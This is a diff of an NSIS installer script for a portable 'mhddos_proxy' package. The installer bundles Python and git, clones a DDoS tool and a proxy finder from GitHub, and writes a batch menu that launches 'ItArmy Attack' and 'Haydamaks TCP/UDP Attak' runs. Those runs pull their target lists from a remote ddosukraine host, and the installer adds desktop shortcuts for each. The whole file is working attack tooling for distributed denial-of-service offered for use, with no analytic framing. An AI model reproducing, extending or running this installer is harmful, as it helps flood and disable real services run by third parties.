@@ -5,7 +5,7 @@
   !include "x64.nsh"
   !include "LogicLib.nsh"
   !include "FileFunc.nsh"
-
+  !include "WinVer.nsh"
 
 ;--------------------------------
 ;General
@@ -19,7 +19,7 @@
 
   ;Define name of the product
   !define PRODUCT "mhddos_proxy_portable"
-  !define PRODUCT_VERSION "1.0.3"
+  !define PRODUCT_VERSION "1.0.4"
   !define UNINSTALLER_NAME "uninstall"
   
   !define MHDDOS_PROXY_SRC "https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git"
@@ -35,6 +35,13 @@
   !define GIT_DIR "$INSTDIR\git"
   
   !define VCREDIST_DIR "$INSTDIR\vc_redist"
+  
+  !define haydamaks_tcp_target "-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt"
+  !define haydamaks_udp_target "-c http://goals.ddosukraine.com.ua/haydamaky/targets_udp.txt"
+  
+  !define proxy_finder_src "https://github.com/porthole-ascend-cinnamon/proxy_finder.git"
+  !define proxy_finder_dir "$INSTDIR\proxy_finder"
+
 
 
   ;Installer Version Information
@@ -110,7 +117,7 @@ FunctionEnd
   !insertmacro MUI_PAGE_DIRECTORY
   !insertmacro MUI_PAGE_INSTFILES
   
-  !define MUI_FINISHPAGE_RUN "$INSTDIR\runner.bat"
+  ;!define MUI_FINISHPAGE_RUN "$INSTDIR\runner.bat"
   !insertmacro MUI_PAGE_FINISH
 
   ;For the uninstaller
@@ -132,21 +139,23 @@ FunctionEnd
 ;--------------------------------
 ;Installer Section
 
-Section ;Visual C++ Redistributable for Visual Studio 2015
+Section ;Visual C++ Redistributable 2015-2022
 	SetOutPath ${VCREDIST_DIR}
+	
+	${If} ${IsWin7} ; patch for windows 7
+		${If} ${RunningX64}
+			File /r "requirements\vc_redist\vc_redist.x64.exe"
+		${Else}
+			File /r "requirements\vc_redist\vc_redist.x86.exe"
+		${EndIf}
 
-	${If} ${RunningX64}
-		File /r "requirements\vc_redist\vc_redist.x64.exe"
-	${Else}
-		File /r "requirements\vc_redist\vc_redist.x86.exe"
-	${EndIf}  
-
-	${If} ${RunningX64}
-		ExecWait 'vc_redist.x64.exe /q /norestart' $0
-		DetailPrint "-- VC_redist.x64.exe runtime exit code = '$0'"
-	${Else}
-		ExecWait 'vc_redist.x86.exe /q /norestart' $0
-		DetailPrint "-- VC_redist.x86.exe runtime exit code = '$0'"
+		${If} ${RunningX64}
+			ExecWait 'vc_redist.x64.exe /q /norestart' $0
+			DetailPrint "-- vc_redist.x64.exe runtime exit code = '$0'"
+		${Else}
+			ExecWait 'vc_redist.x86.exe /q /norestart' $0
+			DetailPrint "-- vc_redist.x86.exe runtime exit code = '$0'"
+		${EndIf}
 	${EndIf}
 SectionEnd
 
@@ -176,25 +185,17 @@ Section "mhddos_proxy"
 
   ;Create optional start menu shortcut for uninstaller and Main component
   CreateDirectory "$SMPROGRAMS\${PRODUCT}"
-  CreateShortCut "$SMPROGRAMS\${PRODUCT}\ItArmy Attack.lnk" "$INSTDIR\runer.bat" "" "$INSTDIR\itarmy.ico" 0
+  CreateShortCut "$SMPROGRAMS\${PRODUCT}\ItArmy Attack.lnk" "$INSTDIR\runer.bat" "-itarmy" "$INSTDIR\itarmy.ico" 0
+  CreateShortCut "$SMPROGRAMS\${PRODUCT}\ItArmy Attack BETA.lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0
   CreateShortCut "$SMPROGRAMS\${PRODUCT}\Uninstall ${PRODUCT}.lnk" "$INSTDIR\${UNINSTALLER_NAME}.exe" "" "$INSTDIR\${UNINSTALLER_NAME}.exe" 0
 
   ;Create uninstaller
   WriteUninstaller "${UNINSTALLER_NAME}.exe"
 
-  FileOpen $9 uninstall_requirements.bat w
-  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
-  FileWrite $9 "${PYTHON_DIR}\python.exe -m pip uninstall --yes -r requirements.txt$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "${PYTHON_DIR}\python.exe -m pip uninstall --yes -r requirements.txt$\r$\n"
-  FileClose $9
-
 SectionEnd
 
 Section "git (portable)"
   SectionIn RO
-  ; Save something else optional to the installation directory.
   SetOutPath ${GIT_DIR}
 
   File /r "requirements\git\*"
@@ -214,109 +215,229 @@ Section "python (portable)"
 		File /r "requirements\python\x86\*"
 	${EndIf}  
 
-  ;File /r "requirements\python"
-
 SectionEnd
 
-
-
-	;ShortCut
-Section
+Section ;RUNNER
   SetOutPath $INSTDIR
   
   FileOpen $9 runner.bat w
-  FileWrite $9 "@echo off$\r$\n"
+  FileWrite $9 "@ECHO off$\r$\n"
   FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
+  FileWrite $9 "CLS$\r$\n"
+  FileWrite $9 "COLOR 0A$\r$\n"
+  
+  FileWrite $9 ":MAIN$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='' goto MAIN_INFO)$\r$\n"
+  FileWrite $9 ":RUN_MHDDOS_PROXY$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy' goto MHDDOS_PROXY)$\r$\n"
+  FileWrite $9 ":RUN_MHDDOS_PROXY_BETA$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_beta' goto MHDDOS_PROXY_BETA)$\r$\n"
+  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
+  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
+  FileWrite $9 ":RUN_UNINSTALL$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-uninstall' goto UNINSTALL)$\r$\n"
+  
+  FileWrite $9 ":run_clone_proxy_finder$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_proxy_finder' goto clone_proxy_finder)$\r$\n"
+  FileWrite $9 ":run_proxy_finder$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-proxy_finder' goto proxy_finder)$\r$\n"
+  
+  FileWrite $9 ":run_haydamaks_tcp$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp' goto haydamaks_tcp)$\r$\n"
+  FileWrite $9 ":run_haydamaks_udp$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp' goto haydamaks_udp)$\r$\n"
+  FileWrite $9 ":run_haydamaks_tcp_beta$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp_beta' goto haydamaks_tcp_beta)$\r$\n"
+  FileWrite $9 ":run_haydamaks_udp_beta$\r$\n"
+  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp_beta' goto haydamaks_udp_beta)$\r$\n"
+  
+  FileWrite $9 ":MAIN_INFO$\r$\n"
+  FileWrite $9 "ECHO.$\r$\n"
+  FileWrite $9 "ECHO 1. Run ItArmy Attak$\r$\n"
+  FileWrite $9 "ECHO 2. Run ItArmy Attak BETA$\r$\n"
+  FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
+  FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
+  FileWrite $9 "if '%choice%'=='1' goto MHDDOS_PROXY$\r$\n"
+  FileWrite $9 "if '%choice%'=='2' goto MHDDOS_PROXY_BETA$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":CLONE_MHDDOS_PROXY$\r$\n"
+  FileWrite $9 "CD $INSTDIR$\r$\n"
+  FileWrite $9 "START /W git clone ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_DIR}$\r$\n"
   FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
-  FileWrite $9 "color 0A$\r$\n"
-  FileWrite $9 "echo	Cheack Update mhddos_proxy$\r$\n"
   FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "echo	OK$\r$\n"
-  FileWrite $9 "echo	Cheack requirements$\r$\n"
-  FileWrite $9 "${PYTHON_DIR}\python.exe -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "echo	OK$\r$\n"
-  FileWrite $9 "echo	Start Attak ItArmy Target$\r$\n"
-  FileWrite $9 "${PYTHON_DIR}\python.exe runner.py --itarmy --debug$\r$\n"
+  FileWrite $9 "START /W python -m pip install --upgrade setuptools$\r$\n"
+  FileWrite $9 "START /W python -m pip install --upgrade pip$\r$\n"
+  FileWrite $9 "START /W python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
+  FileWrite $9 "CD $INSTDIR$\r$\n"
+  FileWrite $9 "START /W git clone -b feature-async ${MHDDOS_PROXY_BETA_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "START /W python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":MHDDOS_PROXY$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Attak ItArmy Target$\r$\n"
+  FileWrite $9 "python runner.py --itarmy --debug$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":MHDDOS_PROXY_BETA$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Attak ItArmy Target BETA$\r$\n"
+  FileWrite $9 "python runner.py --itarmy --debug$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":UNINSTALL$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
+  FileWrite $9 "START /W python -m pip uninstall --yes -r requirements.txt$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 "START /W python -m pip uninstall --yes -r requirements.txt$\r$\n"
+  
+  FileWrite $9 ":clone_proxy_finder$\r$\n"
+  FileWrite $9 "CD $INSTDIR$\r$\n"
+  FileWrite $9 "START /W git clone ${proxy_finder_src} ${proxy_finder_dir}$\r$\n"
+  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "START /W python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":proxy_finder$\r$\n"
+  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update proxy_finder$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Proxy Finder (ItArmy)$\r$\n"
+  FileWrite $9 "python finder.py$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":haydamaks_tcp$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Attak Haydamaks TCP Target$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+ 
+  FileWrite $9 ":haydamaks_udp$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Attak Haydamaks UDP Target$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":haydamaks_tcp_beta$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Attak Haydamaks TCP Target BETA$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+  
+  FileWrite $9 ":haydamaks_udp_beta$\r$\n"
+  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
+  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
+  FileWrite $9 "git pull$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Cheack requirements$\r$\n"
+  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
+  FileWrite $9 "ECHO OK$\r$\n"
+  FileWrite $9 "ECHO Start Attak Haydamaks UDP Target BETA$\r$\n"
+  FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
+  FileWrite $9 "goto END$\r$\n"
+
+  FileWrite $9 ":END$\r$\n"
+  FileWrite $9 "EXIT$\r$\n"
   FileClose $9
 
+  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy"'
 
   File "resources\itarmy.ico"
   
-  CreateShortCut "$DESKTOP\ItArmy Attack.lnk" "$INSTDIR\runner.bat" "" "$INSTDIR\itarmy.ico" 0
- 
-  
+  CreateShortCut "$DESKTOP\ItArmy Attack.lnk" "$INSTDIR\runner.bat" "-itarmy" "$INSTDIR\itarmy.ico" 0
 SectionEnd
 
 
-
-Section	;Clone mhddos_proxy repo and install requirements
-
+Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
+  SectionIn RO
   SetOutPath $INSTDIR
-
-  FileOpen $9 clone_from_source.bat w
-  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
-  FileWrite $9 "CD $INSTDIR$\r$\n"
-  FileWrite $9 "START /W ${GIT_DIR}\git\git.exe clone ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_DIR}$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip install --upgrade pip$\r$\n"
-  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip install -r requirements.txt$\r$\n"
-  FileClose $9
  
-  nsExec::Exec 'cmd /c "$INSTDIR\clone_from_source.bat"'
-
-  Delete $INSTDIR\clone_from_source.bat
-
-SectionEnd
-
-
-Section	"mhddos_proxy_beta (feature-async)";Clone mhddos_proxy_BETA repo and install requirements
-
-  SetOutPath $INSTDIR
-
-  FileOpen $9 clone_beta_from_source.bat w
-  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
-  FileWrite $9 "CD $INSTDIR$\r$\n"
-  FileWrite $9 "START /W ${GIT_DIR}\git\git.exe clone -b feature-async ${MHDDOS_PROXY_BETA_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip install --upgrade pip$\r$\n"
-  FileWrite $9 "START /W ${PYTHON_DIR}\python.exe -m pip install -r requirements.txt$\r$\n"
-  FileClose $9
- 
-  nsExec::Exec 'cmd /c "$INSTDIR\clone_beta_from_source.bat"'
-
-  Delete $INSTDIR\clone_beta_from_source.bat
-
-
-  FileOpen $9 runner_beta.bat w
-  FileWrite $9 "@echo off$\r$\n"
-  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
-  FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  FileWrite $9 "color 0A$\r$\n"
-  FileWrite $9 "echo	Cheack Update mhddos_proxy_beta$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "echo	OK$\r$\n"
-  FileWrite $9 "echo	Cheack requirements$\r$\n"
-  FileWrite $9 "${PYTHON_DIR}\python.exe -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "echo	OK$\r$\n"
-  FileWrite $9 "echo	Start Attak ItArmy Target (BETA)$\r$\n"
-  FileWrite $9 "${PYTHON_DIR}\python.exe runner.py --itarmy --debug$\r$\n"
-  FileClose $9
+  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
   
   File "resources\itarmy_beta.ico"
   
-  CreateShortCut "$DESKTOP\ItArmy Attack BETA.lnk" "$INSTDIR\runner_beta.bat" "" "$INSTDIR\itarmy_beta.ico" 0
+  CreateShortCut "$DESKTOP\ItArmy Attack BETA.lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0
 
 SectionEnd
 
+;Proxy Finder
+Section	"Proxy Finder (Help to find proxies for ItArmy of Ukraine)"
+
+  SetOutPath $INSTDIR
+  
+  File "resources\itarmy_proxy.ico"
+  
+  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_proxy_finder"'
+  
+  CreateShortCut "$DESKTOP\Proxy Finder (ItArmy of Ukraine).lnk" "$INSTDIR\runner.bat" "-proxy_finder" "$INSTDIR\itarmy_proxy.ico" 0
+
+SectionEnd
+
+;Haydamaks
+Section	"Haydamaks Attak"
+
+  SetOutPath $INSTDIR
+  
+  File "resources\haydamaks.ico"
+  File "resources\haydamaks_beta.ico"
+  
+  CreateShortCut "$DESKTOP\Haydamaks TCP Attak.lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp" "$INSTDIR\haydamaks.ico" 0
+  CreateShortCut "$DESKTOP\Haydamaks UDP Attak.lnk" "$INSTDIR\runner.bat" "-haydamaks_udp" "$INSTDIR\haydamaks.ico" 0
+  
+  CreateShortCut "$DESKTOP\Haydamaks TCP Attak BETA.lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp_beta" "$INSTDIR\haydamaks_beta.ico" 0
+  CreateShortCut "$DESKTOP\Haydamaks UDP Attak BETA.lnk" "$INSTDIR\runner.bat" "-haydamaks_udp_beta" "$INSTDIR\haydamaks_beta.ico" 0
+
+SectionEnd
 
 
 ;Uninstaller Section
 
 Section "Uninstall"
 
-  nsExec::ExecToStack  'cmd /c "$INSTDIR\uninstall_requirements.bat"'
+  nsExec::ExecToStack  'cmd /c "$INSTDIR\runner.bat -uninstall"'
   
   ;Remove all registry keys
   DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}"
@@ -334,6 +455,12 @@ Section "Uninstall"
   Delete "$DESKTOP\ItArmy Attack.lnk"
   Delete "$DESKTOP\ItArmy Attack BETA.lnk"
   
+  Delete "$DESKTOP\Proxy Finder (ItArmy of Ukraine).lnk"
+  
+  Delete "$DESKTOP\Haydamaks TCP Attak.lnk"
+  Delete "$DESKTOP\Haydamaks UDP Attak.lnk"
+  Delete "$DESKTOP\Haydamaks TCP Attak BETA.lnk"
+  Delete "$DESKTOP\Haydamaks UDP Attak BETA.lnk"
 
 
 SectionEnd
